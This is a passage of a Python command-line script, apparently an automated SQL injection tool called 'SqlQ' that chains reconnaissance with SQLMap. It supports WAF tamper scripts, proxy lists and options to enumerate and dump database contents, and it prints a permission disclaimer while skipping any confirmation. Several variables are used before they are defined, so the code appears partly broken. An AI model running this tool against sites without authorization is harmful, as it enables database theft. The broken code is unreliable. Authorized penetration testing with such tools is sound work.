    parser.add_argument('--auth-cred', help='HTTP authentication credentials (user:pass)')
    parser.add_argument('--cookie', help='HTTP Cookie header')
    
    # Proxy options
    parser.add_argument('--proxy', help='Proxy URL (http(s)://host:port)')
    parser.add_argument('--proxy-file', help='File containing a list of proxies')
    parser.add_argument('--headers', help='Extra headers')
    
    # Data extraction options
    parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
    parser.add_argument('--tables', action='store_true', help='Enumerate tables')
    parser.add_argument('--columns', action='store_true', help='Enumerate columns')
    parser.add_argument('--dump', action='store_true', help='Dump table contents')
    
    # Output options
    parser.add_argument('--report', help='Output report format (csv, html, etc.)')
    parser.add_argument('--timeout', type=int, help='Timeout for requests (seconds)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.domain and not args.vulnerable_file:
        print("[ERROR] You must specify either a target domain/URL (-u/--url) or a file with vulnerable URLs (--vulnerable-file)")
        sys.exit(1)
        
    # Check if this is a simple one-command scan
    is_integrated_scan = args.domain and not (args.vulnerable_file or args.skip_recon)
    
    # For full scan mode, enable all enhanced features
    if args.full:
        args.api_scan = True
        args.login_scan = True
        args.post_scan = True
        args.js_scan = True
        args.auto_waf = True
        args.dbs = True

    # Set up output directory
    if args.domain:
        domain = args.domain.replace('https://', '').replace('http://', '').split('/')[0]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = args.output or os.path.join(RESULTS_BASE_DIR, f"{domain}_{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        print(f"[*] Starting Scan for: {domain}")
        print(f"[*] Results directory: {output_dir}")
    else:
        # Direct scan mode from vulnerable file - use a generic name
        domain = "direct-scan"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = args.output or os.path.join(RESULTS_BASE_DIR, f"{domain}_{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        print(f"[*] Starting Scan for: {domain}")
        print(f"[*] Results directory: {output_dir}")
        
    # Run the integrated scanning mode if this is a simple command (-u domain.com)
    if is_integrated_scan or args.full or args.api_scan or args.js_scan or args.login_scan or args.post_scan:
        try:
            # Import the integrated scanner
            from integrated_scan import run_integrated_scan
            
            # Print disclaimer without asking for confirmation
            print("="*60)
            print(" SQL INJECTION TESTING TOOL - DISCLAIMER")
            print(" This script will perform reconnaissance and SQL Injection tests.")
            print(" Ensure you have explicit permission to test the target domain!")
            print(" Unauthorized testing may be illegal in your jurisdiction.")
            print("="*60)
            print(f"{Fore.GREEN}[+] Running in fully automatic mode{Style.RESET_ALL}")
            
            # Check if required tools are installed
            success, missing_tools = check_tools()
            if not success:
                sys.exit(1)
                
            # Run the integrated scan
            results = run_integrated_scan(args, output_dir)
            sys.exit(0)
        except ImportError as e:
            print(f"[ERROR] Failed to import integrated scanning module: {e}")
            print("[*] Falling back to standard scanning mode...")
    print(f"[*] Results directory: {output_dir}")
    
    # Skip confirmation in automatic mode
    print(f"{Fore.GREEN}[+] Running in fully automatic mode{Style.RESET_ALL}")
    
    # ... rest of the code remains the same ...
    # Verify required tools
    tools_ok, missing_tools = check_tools()
    if not tools_ok:
        sys.exit(1)
    
    # Determine which mode to run in
    if args.vulnerable_file:
        # Direct scan mode - use provided vulnerable URLs file
        header("DIRECT SCAN MODE")
        success(f"Using provided vulnerable URLs file: {args.vulnerable_file}")
        
        # Copy the file to our results directory
        live_params_urls_file = os.path.join(output_dir, "vulnerable_urls.txt")
        shutil.copy(args.vulnerable_file, live_params_urls_file)
        
        # Count the number of URLs
        with open(live_params_urls_file, 'r') as f:
            url_count = sum(1 for _ in f)
        
        info(f"Loaded {url_count} potentially vulnerable URLs for testing")
        
        # Skip recon process and proceed directly to SQLMap testing
        send_telegram(f"Starting direct SQL injection test on {url_count} URLs from {args.vulnerable_file}")
        
    elif args.skip_recon:
        # Skip recon and use existing files
        print("[*] Skipping reconnaissance (--skip-recon flag set)")
        
        # Define expected files
        subdomains_file = os.path.join(output_dir, "subdomains.txt")
        all_urls_file = os.path.join(output_dir, "all_urls.txt")
        filtered_params_urls_file = os.path.join(output_dir, "filtered_params_urls.txt")
        live_params_urls_file = os.path.join(output_dir, "live_params_urls.txt")
        
        # Check if the required files exist
        if not os.path.exists(filtered_params_urls_file) or not os.path.exists(live_params_urls_file):
            print("[ERROR] --skip-recon set but no existing URL file found. Cannot continue.")
            sys.exit(1)
        
        # Update our filtered_urls_file reference
        filtered_urls_file = limited_urls_file
        url_count = args.max_urls
        
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Limited scan to {args.max_urls} URLs\n")

    # Direct scan mode skips URL checking
    if args.vulnerable_file:
        # For direct scan, we already have the URLs file
        live_count = url_count
        scan_start_time = time.time()  # Define scan_start_time here
        notify_msg = f"Starting SQLMap scans on {live_count} provided URLs for {domain}."
        log_file = os.path.join(output_dir, "scan.log")
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Direct scan with {live_count} URLs\n")
        send_telegram(notify_msg, log_file)
        
        # For direct scan, proceed to SQLMap immediately
        header("SQL INJECTION TESTING PHASE")
        # Run SQLMap scan
        sqlmap_start = time.time()
        scan_results = scan_with_sqlmap(
            live_params_urls_file,
            output_dir,
            tamper_scripts=args.tamper,
            level=args.level,
            risk=args.risk,
            prefix=args.prefix,
            suffix=args.suffix,
            auth_type=args.auth_type,
            auth_cred=args.auth_cred,
            cookie=args.cookie,
            proxy=args.proxy,
            proxy_file=args.proxy_file,
            headers=args.headers,
            get_dbs=args.dbs,
            get_tables=args.tables,
            get_columns=args.columns,
            dump_data=args.dump,
            threads=args.threads,
            verbose=args.verbose,
            auto_waf=args.auto_waf,
            report_format=args.report,
            timeout=args.timeout,
            auto_enum_dbs=True
        )
        sqlmap_end = time.time()
        sqlmap_duration = sqlmap_end - sqlmap_start
        
        # Generate scan summary
        summary_file = os.path.join(output_dir, "scan_summary.txt")
        with open(summary_file, 'w') as f:
            f.write(f"SqlQ Scan Summary for {domain}\n")
            f.write(f"{'='*50}\n")
            f.write(f"Scan started at: {datetime.fromtimestamp(scan_start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total scan duration: {(time.time() - scan_start_time)/60:.2f} minutes\n\n")
            
            f.write(f"Direct scan mode: Used {live_count} provided URLs\n")
            f.write(f"SQLMap scan duration: {sqlmap_duration/60:.2f} minutes\n\n")
            
            f.write(f"WAF Detection: {'Enabled' if args.auto_waf else 'Disabled'}\n")
            if args.tamper:
                f.write(f"User-specified tamper scripts: {args.tamper}\n")
                
            f.write(f"\nResults saved to: {output_dir}\n")
        
        scan_end_time = time.time()
        duration_mins = (scan_end_time - scan_start_time) / 60
        
        print(f"\n[COMPLETE] SQL Injection scan completed in {duration_mins:.2f} minutes.")
        print(f"Results saved to {output_dir}")
        print(f"Scan summary saved to {summary_file}")
        
        # Final notification
        completion_msg = f"Scan completed for {domain} in {duration_mins:.2f} minutes. Check {output_dir} for results."
        send_telegram(completion_msg, log_file)
        
        # Exit after direct scan is complete
        sys.exit(0)
    elif url_count > 0:
        # Check which URLs are live (standard flow)
        live_count = check_live_urls(filtered_urls_file, live_urls_file)
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Found {live_count} live URLs with parameters\n")
        
        if live_count > 0:
            # Notify about starting SQLMap scan
            notify_msg = f"Found {live_count} live URLs with parameters for {target_domain}. Starting SQLMap scans now."
            send_telegram(notify_msg, log_file)
            
            # Run SQLMap scan
            sqlmap_start = time.time()
            scan_results = scan_with_sqlmap(
                live_params_urls_file if args.vulnerable_file else live_urls_file,
                results_dir,
                tamper_scripts=args.tamper,
                level=args.level,
                risk=args.risk,
                prefix=args.prefix,
                suffix=args.suffix,
                auth_type=args.auth_type,
                auth_cred=args.auth_cred,
                cookie=args.cookie,
                proxy=args.proxy,
                proxy_file=args.proxy_file,
                headers=args.headers,
                get_dbs=args.dbs,
                get_tables=args.tables,
                get_columns=args.columns,
                dump_data=args.dump,
                threads=args.threads,
                verbose=args.verbose,
                auto_waf=args.auto_waf,
                report_format=args.report,
                timeout=args.timeout,
                auto_enum_dbs=True
            )
            sqlmap_end = time.time()
            sqlmap_duration = sqlmap_end - sqlmap_start
            
            # Generate scan summary
            with open(summary_file, 'w') as f:
                f.write(f"SqlQ Scan Summary for {target_domain}\n")
                f.write(f"{'='*50}\n")
                f.write(f"Scan started at: {datetime.fromtimestamp(scan_start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total scan duration: {(time.time() - scan_start_time)/60:.2f} minutes\n\n")
                
                f.write(f"Subdomain enumeration: {sum(1 for _ in open(subdomain_file))} subdomains found\n")
                f.write(f"URL analysis: {url_count} URLs with parameters found\n")
                f.write(f"Live URLs: {live_count} URLs were accessible\n")
                f.write(f"SQLMap scan duration: {sqlmap_duration/60:.2f} minutes\n\n")
                
                f.write(f"WAF Detection: {'Enabled' if args.auto_waf else 'Disabled'}\n")
                if args.tamper:
                    f.write(f"User-specified tamper scripts: {args.tamper}\n")
                    
                f.write(f"\nResults saved to: {results_dir}\n")
            
            scan_end_time = time.time()
            duration_mins = (scan_end_time - scan_start_time) / 60
            
            print(f"\n[COMPLETE] SQL Injection scan completed in {duration_mins:.2f} minutes.")
            print(f"Results saved to {results_dir}")
            print(f"Scan summary saved to {summary_file}")
            
            # Final notification
            completion_msg = f"Scan completed for {domain} in {duration_mins:.2f} minutes. Check {results_dir} for results."
            send_telegram(completion_msg, log_file)
        else:
            msg = f"Scan completed for {domain}, but no live URLs with parameters were found."
            print(f"[-] {msg}")
            send_telegram(msg, log_file)
    else:
        msg = f"Scan completed for {domain}, but no URLs with parameters were found."
        print(f"[-] {msg}")
        send_telegram(msg, log_file)
